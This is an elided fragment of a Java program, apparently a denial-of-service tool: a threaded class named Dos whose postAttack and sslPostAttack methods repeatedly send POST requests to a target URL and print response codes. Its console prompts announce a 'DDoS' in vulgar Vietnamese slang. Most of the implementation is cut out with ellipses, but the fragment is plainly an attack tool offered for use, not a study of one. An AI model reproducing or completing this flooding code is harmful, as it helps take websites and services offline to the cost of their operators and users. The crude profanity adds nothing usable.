...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Setting DDoS By: Địt Atackk!!");

        System.out.print("Địt Mấy Nháy: ");
        ...
        System.out.println("Bắt Đầu Địt!!");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Địt Mẹ Không Die Đâu!!: " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void sslPostAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("lo!:" + responseCode + "Thread: " + this.seq);
    }
